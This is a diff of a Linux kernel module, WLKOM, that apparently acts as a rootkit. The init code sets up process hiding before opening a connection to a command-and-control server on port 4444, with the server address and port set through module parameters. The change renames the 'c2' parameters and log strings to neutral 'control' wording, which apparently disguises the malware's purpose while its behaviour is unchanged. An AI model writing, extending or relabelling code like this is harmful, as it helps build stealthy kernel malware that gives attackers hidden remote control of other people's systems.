@@ -13,22 +13,21 @@ MODULE_AUTHOR("WLKOM Team");
 MODULE_DESCRIPTION("Wild Linux Kernel Object Module");
 MODULE_VERSION(WLKOM_VERSION);
 
-/* ─── Module parameters ─── */
-static char c2_ip[64] = "127.0.0.1";
-static int c2_port = 4444;
+static char control_ip[64] = "127.0.0.1";
+static int control_port = 4444;
 
-module_param_string(c2_ip, c2_ip, sizeof(c2_ip), 0644);
-MODULE_PARM_DESC(c2_ip, "C2 server IP address");
+module_param_string(control_ip, control_ip, sizeof(control_ip), 0644);
+MODULE_PARM_DESC(control_ip, "Control server IP address");
 
-module_param(c2_port, int, 0644);
-MODULE_PARM_DESC(c2_port, "C2 server port");
+module_param(control_port, int, 0644);
+MODULE_PARM_DESC(control_port, "Control server port");
 
 static int __init wlkom_init(void)
 {
     int ret;
 
     pr_info("WLKOM: module loading...\n");
-    pr_info("WLKOM: C2 IP = %s, Port = %d\n", c2_ip, c2_port);
+    pr_info("WLKOM: Control IP = %s, Port = %d\n", control_ip, control_port);
 
     /* Initialize hiding FIRST */
     ret = hide_init();
@@ -51,7 +50,7 @@ static int __init wlkom_init(void)
     }
 
     /* Initialize connection to C2 */
-    ret = connect_init(c2_ip, c2_port);
+    ret = connect_init(control_ip, control_port);
     if (ret < 0)
     {
         pr_err("WLKOM: failed to initialize connection\n");
